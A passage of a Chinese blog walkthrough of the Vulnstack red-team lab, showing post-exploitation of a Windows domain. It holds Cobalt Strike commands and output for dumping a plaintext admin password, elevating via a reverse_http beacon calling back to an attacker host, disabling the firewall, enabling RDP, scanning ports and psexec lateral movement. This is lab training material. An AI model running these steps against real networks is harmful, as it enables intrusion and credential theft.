class=\"hljs-number\"\u003e4814\u003c/span\u003e-A715-9248D845EA0F} (000C29ACFA05)\n\n软件版本                     Windows Server \u003cspan class=\"hljs-number\"\u003e2008\u003c/span\u003e R2 Standard\n\n工作站域                     DE1AY\n工作站域 DNS 名称            de1ay.com\n登录域                       DE1AY\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e域为\u003ccode\u003ede1ay.com\u003c/code\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e查看本机用户（本机以及域用户）\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003eC:\\Oracle\\Middleware\\user_projects\\domains\\base_domain\u003enet user    \nnet user\n\nUser accounts \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e \\\\WEB\n\n-------------------------------------------------------------------------------\nAdministrator            de1ay                    Guest                    \nThe command completed successfully.\n\u003cspan class=\"hljs-comment\"\u003e# 查看域用户被拒绝\u003c/span\u003e\nC:\\Oracle\\Middleware\\user_projects\\domains\\base_domain\u003enet user /domain\nnet user /domain\nThe request will be processed at a domain controller \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e domain de1ay.com.\n\nSystem error \u003cspan class=\"hljs-number\"\u003e5\u003c/span\u003e has occurred.\n\nAccess \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e denied.\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e查看域中主机，也是权限不足\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003eC:\\Oracle\\Middleware\\user_projects\\domains\\base_domain\u003enet group \u003cspan class=\"hljs-string\"\u003e\"domain computers\"\u003c/span\u003e /domain\nThe request will be processed at a domain controller \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e domain de1ay.com.\n\nSystem error \u003cspan class=\"hljs-number\"\u003e5\u003c/span\u003e has occurred.\n\nAccess \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e denied.\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e查看ARP列表\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003emeterpreter \u003e arp -a\n\nARP cache\n=========\n\n    IP address       MAC address        Interface\n    ----------       -----------        ---------\n    \u003cspan class=\"hljs-number\"\u003e10.10\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.10\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.1\u003c/span\u003e       \u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e50\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e56\u003c/span\u003e:c0:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:01  Intel(R) PRO/\u003cspan class=\"hljs-number\"\u003e1000\u003c/span\u003e MT Network Connection \u003cspan class=\"hljs-comment\"\u003e#2\u003c/span\u003e\n    \u003cspan class=\"hljs-number\"\u003e10.10\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.10\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.10\u003c/span\u003e      \u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:0c:\u003cspan class=\"hljs-number\"\u003e29\u003c/span\u003e:9c:\u003cspan class=\"hljs-number\"\u003e85\u003c/span\u003e:b6  Intel(R) PRO/\u003cspan class=\"hljs-number\"\u003e1000\u003c/span\u003e MT Network Connection \u003cspan class=\"hljs-comment\"\u003e#2\u003c/span\u003e\n    \u003cspan class=\"hljs-number\"\u003e10.10\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.10\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.201\u003c/span\u003e     \u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:0c:\u003cspan class=\"hljs-number\"\u003e29\u003c/span\u003e:ad:ee:c1  Intel(R) PRO/\u003cspan class=\"hljs-number\"\u003e1000\u003c/span\u003e MT Network Connection \u003cspan class=\"hljs-comment\"\u003e#2\u003c/span\u003e\n    \u003cspan class=\"hljs-number\"\u003e10.10\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.10\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.255\u003c/span\u003e     ff:ff:ff:ff:ff:ff  Intel(R) PRO/\u003cspan class=\"hljs-number\"\u003e1000\u003c/span\u003e MT Network Connection \u003cspan class=\"hljs-comment\"\u003e#2\u003c/span\u003e\n    \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.111\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.1\u003c/span\u003e    \u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e50\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e56\u003c/span\u003e:c0:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:08  Intel(R) PRO/\u003cspan class=\"hljs-number\"\u003e1000\u003c/span\u003e MT Network Connection\n    \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.111\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.150\u003c/span\u003e  \u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:0c:\u003cspan class=\"hljs-number\"\u003e29\u003c/span\u003e:de:\u003cspan class=\"hljs-number\"\u003e14\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e88\u003c/span\u003e  Intel(R) PRO/\u003cspan class=\"hljs-number\"\u003e1000\u003c/span\u003e MT Network Connection\n    \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.111\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.255\u003c/span\u003e  ff:ff:ff:ff:ff:ff  Intel(R) PRO/\u003cspan class=\"hljs-number\"\u003e1000\u003c/span\u003e MT Network Connection\n    \u003cspan class=\"hljs-number\"\u003e224.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.22\u003c/span\u003e       \u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e  Software Loopback Interface \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e\n    \u003cspan class=\"hljs-number\"\u003e224.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.22\u003c/span\u003e       01:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:5e:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e16\u003c/span\u003e  Intel(R) PRO/\u003cspan class=\"hljs-number\"\u003e1000\u003c/span\u003e MT Network Connection\n    \u003cspan class=\"hljs-number\"\u003e224.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.22\u003c/span\u003e       01:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:5e:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e16\u003c/span\u003e  Intel(R) PRO/\u003cspan class=\"hljs-number\"\u003e1000\u003c/span\u003e MT Network Connection \u003cspan class=\"hljs-comment\"\u003e#2\u003c/span\u003e\n    \u003cspan class=\"hljs-number\"\u003e224.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.252\u003c/span\u003e      01:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:5e:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:fc  Intel(R) PRO/\u003cspan class=\"hljs-number\"\u003e1000\u003c/span\u003e MT Network Connection\n    \u003cspan class=\"hljs-number\"\u003e224.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.252\u003c/span\u003e      01:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:5e:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e:fc  Intel(R) PRO/\u003cspan class=\"hljs-number\"\u003e1000\u003c/span\u003e MT Network Connection \u003cspan class=\"hljs-comment\"\u003e#2\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e发现内网主机 \u003ccode\u003e10\u003c/code\u003e，\u003ccode\u003e201\u003c/code\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch3\u003eCS抓取kiwi抓取密码及web主机提权\u003c/h3\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003eCS抓取明文密码\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E4%BA%8C)/image26.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003ekerberos :\t\n\t * Username : Administrator \u003cspan class=\"hljs-comment\"\u003e# 大概率是域管理员\u003c/span\u003e\n\t * Domain   : de1ay.com\n\t * Password : 1qaz@WSX\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e得到密码\u003ccode\u003e1qaz@WSX\u003c/code\u003e ，很多用户（\u003ccode\u003ede1ay\u003c/code\u003e,\u003ccode\u003emssql\u003c/code\u003e）的密码都是这个，扫描到主机后可以横向移动\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e之前在MSF提权不成功，尝试在CS提权\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E4%BA%8C)/image27.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003ebeacon\u003e elevate svc-exe HTTP-\u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e\n[*] Tasked beacon to run windows/beacon_http/reverse_http (\u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.111\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.150\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e) via Service Control Manager (\\\\\u003cspan class=\"hljs-number\"\u003e127.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.1\u003c/span\u003e\\ADMIN$\\722628d.exe)\n[+] host called home, sent: \u003cspan class=\"hljs-number\"\u003e313305\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003ebytes\u003c/span\u003e\n[+] received output:\nStarted service 722628d on .\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e提权成功，多出来一个会话，是\u003ccode\u003esystem\u003c/code\u003e权限的\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E4%BA%8C)/image28.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch3\u003eweb主机远程桌面\u003c/h3\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e关闭防火墙（提权后第一件要做的事）\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003ebeacon\u003e shell netsh advfirewall \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e allprofiles state off\n[*] Tasked beacon to run: netsh advfirewall \u003cspan class=\"hljs-built_in\"\u003eset\u003c/span\u003e allprofiles state off\n[+] host called home, sent: \u003cspan class=\"hljs-number\"\u003e74\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003ebytes\u003c/span\u003e\n确定。\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e注册表开启远程桌面\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003ebeacon\u003e shell REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\u003cspan class=\"hljs-string\"\u003e\" \"\u003c/span\u003eServer /v fDenyTSConnections /t REG_DWORD /d \u003cspan class=\"hljs-number\"\u003e00000000\u003c/span\u003e /f\n[*] Tasked beacon to run: REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\u003cspan class=\"hljs-string\"\u003e\" \"\u003c/span\u003eServer /v fDenyTSConnections /t REG_DWORD /d \u003cspan class=\"hljs-number\"\u003e00000000\u003c/span\u003e /f\n[+] host called home, sent: \u003cspan class=\"hljs-number\"\u003e144\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003ebytes\u003c/span\u003e\n[+] received output:\n操作成功完成\n\u003c/code\u003e\u003c/pre\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e连接远程桌面\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003eproxychains rdesktop \u003cspan class=\"hljs-number\"\u003e192.168\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.111\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.80\u003c/span\u003e -p 1qaz@WSX -u administrator\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e登录 \u003ccode\u003ede1ay\\administrator\u003c/code\u003e 时，需要更改新密码，我们将它修改为\u003ccode\u003eAa118811\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E4%BA%8C)/image29.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e登陆成功\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e在里边进行信息收集\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E4%BA%8C)/image30.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e得到域成员 \u003ccode\u003ePC,WEB\u003c/code\u003e以及域控\u003ccode\u003eDC\u003c/code\u003e ，但是不知道\u003ccode\u003eIP\u003c/code\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch3\u003e使用CS进行端口扫描\u003c/h3\u003e\n\u003cp\u003e由于\u003ccode\u003eCS\u003c/code\u003e上目标只能发现WEB主机一台，没发现域内别的主机渗透不下去，也不能进行横向移动\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E4%BA%8C)/image31.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003ebeacon\u003e portscan \u003cspan class=\"hljs-number\"\u003e10.10\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.10\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e10.10\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.10\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.255\u003c/span\u003e \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e1024\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e3389\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e5000\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e6000\u003c/span\u003e arp \u003cspan class=\"hljs-number\"\u003e1024\u003c/span\u003e\n[*] Tasked beacon to scan ports \u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e1024\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e3389\u003c/span\u003e,\u003cspan class=\"hljs-number\"\u003e5000\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e6000\u003c/span\u003e on \u003cspan class=\"hljs-number\"\u003e10.10\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.10\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.0\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e10.10\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.10\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.255\u003c/span\u003e\n[+] host called home, sent: \u003cspan class=\"hljs-number\"\u003e75365\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003ebytes\u003c/span\u003e\n[+] received output:\n(ARP) Target \u003cspan class=\"hljs-string\"\u003e'10.10.10.80'\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e alive. \u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e-0C-\u003cspan class=\"hljs-number\"\u003e29\u003c/span\u003e-AC-FA-05\n(ARP) Target \u003cspan class=\"hljs-string\"\u003e'10.10.10.201'\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e alive. \u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e-0C-\u003cspan class=\"hljs-number\"\u003e29\u003c/span\u003e-AD-EE-C1\n(ARP) Target \u003cspan class=\"hljs-string\"\u003e'10.10.10.254'\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e alive. \u003cspan class=\"hljs-number\"\u003e00\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e50\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e56\u003c/span\u003e-E7-\u003cspan class=\"hljs-number\"\u003e10\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e69\u003c/span\u003e\n\u003cspan class=\"hljs-number\"\u003e10.10\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.10\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.201\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e3389\u003c/span\u003e\n\u003cspan class=\"hljs-number\"\u003e10.10\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.10\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.201\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e139\u003c/span\u003e\n\u003cspan class=\"hljs-number\"\u003e10.10\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.10\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.201\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e135\u003c/span\u003e\n\u003cspan class=\"hljs-number\"\u003e10.10\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.10\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.80\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e3389\u003c/span\u003e\n\u003cspan class=\"hljs-number\"\u003e10.10\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.10\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.80\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e139\u003c/span\u003e\n\u003cspan class=\"hljs-number\"\u003e10.10\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.10\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.80\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e135\u003c/span\u003e\n\u003cspan class=\"hljs-number\"\u003e10.10\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.10\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.80\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e80\u003c/span\u003e\n\u003cspan class=\"hljs-number\"\u003e10.10\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.10\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.10\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e5985\u003c/span\u003e\n\u003cspan class=\"hljs-number\"\u003e10.10\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.10\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.10\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e3389\u003c/span\u003e\n\u003cspan class=\"hljs-number\"\u003e10.10\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.10\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.10\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e636\u003c/span\u003e\n\u003cspan class=\"hljs-number\"\u003e10.10\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.10\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.10\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e593\u003c/span\u003e\n\u003cspan class=\"hljs-number\"\u003e10.10\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.10\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.10\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e464\u003c/span\u003e\n\u003cspan class=\"hljs-number\"\u003e10.10\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.10\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.10\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e389\u003c/span\u003e\n\u003cspan class=\"hljs-number\"\u003e10.10\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.10\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.10\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e139\u003c/span\u003e\n\u003cspan class=\"hljs-number\"\u003e10.10\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.10\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.10\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e135\u003c/span\u003e\n\u003cspan class=\"hljs-number\"\u003e10.10\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.10\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.10\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e88\u003c/span\u003e\n\u003cspan class=\"hljs-number\"\u003e10.10\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.10\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.10\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e53\u003c/span\u003e\n\u003cspan class=\"hljs-number\"\u003e10.10\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.10\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.1\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e5357\u003c/span\u003e\n\u003cspan class=\"hljs-number\"\u003e10.10\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.10\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.1\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e5040\u003c/span\u003e\n\u003cspan class=\"hljs-number\"\u003e10.10\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.10\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.1\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e3389\u003c/span\u003e\n\u003cspan class=\"hljs-number\"\u003e10.10\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.10\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.1\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e912\u003c/span\u003e\n\u003cspan class=\"hljs-number\"\u003e10.10\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.10\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.1\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e902\u003c/span\u003e\n\u003cspan class=\"hljs-number\"\u003e10.10\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.10\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.1\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e139\u003c/span\u003e\n\u003cspan class=\"hljs-number\"\u003e10.10\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.10\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.1\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e135\u003c/span\u003e\n\u003cspan class=\"hljs-number\"\u003e10.10\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.10\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.1\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e\n\u003cspan class=\"hljs-number\"\u003e10.10\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.10\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.10\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e (platform: \u003cspan class=\"hljs-number\"\u003e500\u003c/span\u003e version: \u003cspan class=\"hljs-number\"\u003e6.3\u003c/span\u003e name: DC domain: DE1AY)\n\u003cspan class=\"hljs-number\"\u003e10.10\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.10\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.80\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e (platform: \u003cspan class=\"hljs-number\"\u003e500\u003c/span\u003e version: \u003cspan class=\"hljs-number\"\u003e6.1\u003c/span\u003e name: WEB domain: DE1AY)\n\u003cspan class=\"hljs-number\"\u003e10.10\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.10\u003c/span\u003e\u003cspan class=\"hljs-number\"\u003e.201\u003c/span\u003e:\u003cspan class=\"hljs-number\"\u003e445\u003c/span\u003e (platform: \u003cspan class=\"hljs-number\"\u003e500\u003c/span\u003e version: \u003cspan class=\"hljs-number\"\u003e6.1\u003c/span\u003e name: PC domain: DE1AY)\nScanner module \u003cspan class=\"hljs-keyword\"\u003eis\u003c/span\u003e complete\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e扫出来主机\u003ccode\u003e10.10.10.10\u003c/code\u003e以及\u003ccode\u003e10.10.10.201\u003c/code\u003e,\u003ccode\u003e10.10.10.80\u003c/code\u003e是web主机，并且都扫描出了\u003ccode\u003e445\u003c/code\u003e端口，并且都开启\u003ccode\u003e3389\u003c/code\u003e端口\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E4%BA%8C)/image32.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003eCS的目标主机也发现了，DC是\u003ccode\u003e10.10.10.10\u003c/code\u003e，PC是\u003ccode\u003e10.10.10.201\u003c/code\u003e\u003c/p\u003e\n\u003ch3\u003e横向移动\u003c/h3\u003e\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003e因为域内所有主机都开启\u003ccode\u003e445\u003c/code\u003e端口，所以我们创建一个SMB监听器来进行横向\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E4%BA%8C)/image33.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e在\u003ccode\u003eCS\u003c/code\u003e再抓一次明文密码，因为我们之前登录远程桌面时修改了\u003ccode\u003ede1ay/administrator\u003c/code\u003e的密码\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e进行横向，右键\u003ccode\u003eDC\u003c/code\u003e选择\u003ccode\u003epsexec\u003c/code\u003e ，然后选择刚刚创建\u003ccode\u003eSMB\u003c/code\u003e监听器，点击\u003ccode\u003eLaunch\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/Vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA(%E4%BA%8C)/image34.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-python\"\u003ebeacon\u003e jump psexec DC SMB-\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e\n[*] Tasked beacon to run windows/beacon_bind_pipe (\\\\.\\pipe\\test) on DC via Service Control Manager (\\\\DC\\ADMIN$\\eb3da6e.exe)\n[+] host called home, sent: \u003cspan 